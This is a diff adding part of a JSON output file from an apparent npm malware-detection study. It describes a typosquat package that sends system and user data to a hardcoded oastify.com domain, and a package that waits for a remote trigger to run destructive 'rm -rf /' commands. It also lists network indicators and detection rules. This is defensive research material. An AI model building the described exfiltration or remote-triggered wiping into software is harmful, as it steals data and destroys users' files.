+                  "similar_legitimate_use": "Some legitimate packages implement telemetry or crash reporting, but only with explicit user consent, clear documentation, and transmission to trusted domains.",
+                  "key_indicators": [
+                    "Collection of home directory, username, hostname, and DNS servers",
+                    "Hardcoded external domain (r7z12f7knlides86u06z22fpzg57tzho.oastify.com) for data exfiltration",
+                    "No legitimate icon font functionality present",
+                    "Use of os and dns modules to gather environment details"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (upon package use)",
+                  "file_location": "main index.js or entry point of transferwise-iconfont",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/test/acceptance/server_exporter_test.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/test/unit/jobserver_collector_test.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": []
+    }
+  ]
+}
